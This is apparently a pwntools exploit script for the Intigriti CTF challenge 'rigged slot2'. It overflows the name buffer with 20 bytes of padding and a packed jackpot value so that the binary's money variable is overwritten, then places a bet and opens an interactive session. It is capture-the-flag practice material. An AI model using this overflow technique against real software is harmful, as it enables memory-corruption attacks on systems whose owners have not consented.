#!/usr/bin/python3
from pwn import *

#elf = context.binary = ELF("rigged_slot2_patched")
elf = context.binary = ELF("original_not_patched_slot2")

gs = '''
b *main+339
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("riggedslot2.ctf.intigriti.io", 1337)
    else:
        return process(elf.path)

# Plan:

# Addresses

# Jackpot value: 0x14684c

# Functions

io = start()

p = b"A"*20 + p32(0x14684c + 0x1) # We need to add one because it will subtract it from our total amount of money when betting
#test = b"A"*20 + p32(0x146856)

io.recvuntil(b"Enter your name:")
io.sendline(p)

io.recvuntil(b"Enter your bet amount (up to $100 per spin): ")
io.sendline(b"1")

print(io.recvline(timeout=1))
print(io.recvline(timeout=1))
print(io.recvline(timeout=1))
print(io.recvline(timeout=1))
print(io.recvline(timeout=1))

io.interactive()
